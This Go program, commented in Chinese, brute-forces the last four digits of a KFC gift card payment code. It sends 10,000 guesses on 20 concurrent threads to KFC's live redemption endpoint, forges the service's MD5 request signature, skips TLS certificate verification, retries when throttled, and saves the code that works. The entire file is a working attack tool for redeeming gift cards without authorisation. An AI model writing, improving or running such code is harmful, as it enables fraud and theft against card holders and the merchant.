package main

// KFC 礼品卡 paymentCode 多线程枚举 (Go 版)
// 读取 config.json 配置，枚举 paymentCode 后4位

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config 配置文件结构
type Config struct {
	// 礼品卡信息
	CardSequence  string `json:"cardSequence"`  // 卡号
	PaymentPrefix string `json:"paymentPrefix"` // 密码前16位
	Token         string `json:"token"`         // 登录凭证
	OpenID        string `json:"openId"`        // 微信 openId

	// kbsv 签名参数
	ClientKey string `json:"clientKey"`
	ClientSec string `json:"clientSec"`
	SignPath  string `json:"signPath"`
	FullURL   string `json:"fullUrl"`

	// 运行参数
	Threads   int `json:"threads"`   // 并发线程数
	MaxRetry  int `json:"maxRetry"`  // 单个卡密最大重试次数
	RetryWait int `json:"retryWait"` // 重试前等待秒数
}

// RequestBody 请求体（字段顺序决定 JSON 输出顺序）
type RequestBody struct {
	Token               string   `json:"token"`
	CardSequence        string   `json:"cardSequence"`
	PaymentCode         string   `json:"paymentCode"`
	OpenID              string   `json:"openId"`
	EncodeList          []string `json:"encodeList"`
	IsFromCustomerClient bool    `json:"isFromCustomerClient"`
	SecretKey           string   `json:"secretKey"`
}

// Response 响应体
type Response struct {
	ErrCode   interface{} `json:"errCode"`
	ErrData   string      `json:"errData"`
	ErrMsg    string      `json:"errMsg"`
	ErrorCode interface{} `json:"errorCode"`
}

var (
	cfg        Config
	foundFlag  atomic.Bool
	doneCount  atomic.Int64
	httpClient *http.Client
)

// calcKbsv 计算 kbsv 签名
func calcKbsv(timestamp, bodyJSON string) string {
	raw := cfg.ClientKey + "\t" + cfg.ClientSec + "\t" + timestamp + "\t" + cfg.SignPath + "\t\t" + bodyJSON
	h := md5.Sum([]byte(raw))
	return hex.EncodeToString(h[:])
}

// tryOne 尝试一个卡密后缀，返回响应文本
func tryOne(suffix string) string {
	paymentCode := cfg.PaymentPrefix + suffix
	timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())

	body := RequestBody{
		Token:               cfg.Token,
		CardSequence:        cfg.CardSequence,
		PaymentCode:         paymentCode,
		OpenID:              cfg.OpenID,
		EncodeList:          []string{"smsCode"},
		IsFromCustomerClient: true,
		SecretKey:           "kfc",
	}

	bodyBytes, _ := json.Marshal(body)
	bodyJSON := string(bodyBytes)

	kbsv := calcKbsv(timestamp, bodyJSON)

	req, err := http.NewRequest("POST", cfg.FullURL, strings.NewReader(bodyJSON))
	if err != nil {
		return fmt.Sprintf(`{"errCode":-1,"errMsg":"异常:%s"}`, err.Error())
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Yumc-Route-Cell", "yumc4")
	req.Header.Set("X-Yumc-Route-Channel", "weapp")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Referer", "https://servicewechat.com/wx08ee7f7d36a2eff8/455/page-frame.html")
	req.Header.Set("Host", "appcamp.kfc.com.cn")
	req.Header.Set("kbck", cfg.ClientKey)
	req.Header.Set("kbcts", timestamp)
	req.Header.Set("kbsv", kbsv)

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Sprintf(`{"errCode":-1,"errMsg":"异常:%s"}`, err.Error())
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	return string(data)
}

// parseErrCode 解析 errCode 为字符串
func parseErrCode(code interface{}) string {
	switch v := code.(type) {
	case float64:
		return fmt.Sprintf("%v", int64(v))
	case string:
		return v
	case nil:
		return ""
	default:
		return fmt.Sprintf("%v", v)
	}
}

// worker 工作线程
func worker(jobs <-chan string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	for suffix := range jobs {
		if foundFlag.Load() {
			return
		}

		// 带重试的循环
		retry := 0
		for {
			if foundFlag.Load() {
				return
			}

			body := tryOne(suffix)
			var resp Response
			json.Unmarshal([]byte(body), &resp)

			errCode := parseErrCode(resp.ErrCode)
			msg := resp.ErrMsg
			paymentCode := cfg.PaymentPrefix + suffix
			tag := ""
			if retry > 0 {
				tag = fmt.Sprintf("[重试%d次]", retry)
			}

			// 兑换成功
			if errCode == "0" {
				foundFlag.Store(true)
				fmt.Printf("\n%s\n", strings.Repeat("=", 60))
				fmt.Printf(">>> ✅ 兑换成功!\n")
				fmt.Printf(">>> 卡号: %s\n", cfg.CardSequence)
				fmt.Printf(">>> 密码: %s\n", paymentCode)
				fmt.Printf(">>> 响应: %s\n", truncate(body, 500))
				fmt.Printf("%s\n", strings.Repeat("=", 60))

				// 保存结果
				os.WriteFile("found_payment.txt", []byte(fmt.Sprintf(
					"卡号(cardSequence): %s\n密码(paymentCode):   %s\n响应: %s\n",
					cfg.CardSequence, paymentCode, body)), 0644)
				return
			}

			// 541 = 卡号或密码错误，跳过
			if strings.Contains(errCode, "541") {
				fmt.Printf("[%s]%s %s\n", paymentCode, tag, msg)
				doneCount.Add(1)
				break // 跳出重试循环，取下一个
			}

			// 其他错误 → 重试
			if retry < cfg.MaxRetry {
				fmt.Printf("[%s]%s %s -> 等待%ds后重试\n", paymentCode, tag, msg, cfg.RetryWait)
				time.Sleep(time.Duration(cfg.RetryWait) * time.Second)
				retry++
				continue
			}
			// 达到最大重试次数
			fmt.Printf("[%s]%s %s -> 已达最大重试次数(%d)，跳过\n", paymentCode, tag, msg, cfg.MaxRetry)
			doneCount.Add(1)
			break
		}
	}
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}

func main() {
	// 读取配置
	configData, err := os.ReadFile("config.json")
	if err != nil {
		fmt.Printf("读取 config.json 失败: %s\n", err)
		fmt.Println("请确保 config.json 与本程序在同一目录")
		os.Exit(1)
	}

	if err := json.Unmarshal(configData, &cfg); err != nil {
		fmt.Printf("解析 config.json 失败: %s\n", err)
		os.Exit(1)
	}

	// 默认值
	if cfg.Threads == 0 {
		cfg.Threads = 20
	}
	if cfg.MaxRetry == 0 {
		cfg.MaxRetry = 5
	}
	if cfg.RetryWait == 0 {
		cfg.RetryWait = 3
	}

	// HTTP 客户端（跳过证书校验）
	httpClient = &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// 打印信息
	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("KFC 礼品卡 paymentCode 多线程枚举")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("卡号(cardSequence): %s\n", cfg.CardSequence)
	fmt.Printf("密码前缀:           %s\n", cfg.PaymentPrefix)
	fmt.Printf("枚举范围:           %s0000 ~ %s9999\n", cfg.PaymentPrefix, cfg.PaymentPrefix)
	fmt.Printf("线程数:             %d\n", cfg.Threads)
	fmt.Printf("最大重试:           %d 次\n", cfg.MaxRetry)
	fmt.Printf("成功条件:           errCode = 0")
	fmt.Printf("\n%s\n\n", strings.Repeat("=", 60))

	start := time.Now()

	jobs := make(chan string, 1000)
	var wg sync.WaitGroup

	// 启动 worker
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go worker(jobs, nil, &wg)
	}

	// 进度监控 goroutine
	go func() {
		for !foundFlag.Load() {
			time.Sleep(5 * time.Second)
			done := doneCount.Load()
			elapsed := time.Since(start).Seconds()
			rate := float64(done) / elapsed
			fmt.Printf("\n--- 进度: %d/10000 | %.0freq/s | 已用%.0fs ---\n\n", done, rate, elapsed)
		}
	}()

	// 投递任务
	for i := 0; i < 10000; i++ {
		if foundFlag.Load() {
			break
		}
		jobs <- fmt.Sprintf("%04d", i)
	}
	close(jobs)

	wg.Wait()

	elapsed := time.Since(start).Seconds()
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	if foundFlag.Load() {
		fmt.Printf("✅ 完成! 耗时 %.0fs\n", elapsed)
		fmt.Println("结果已保存到 found_payment.txt")
	} else {
		fmt.Printf("❌ 未找到(errCode=0)，耗时 %.0fs\n", elapsed)
	}
	fmt.Println(strings.Repeat("=", 60))
}
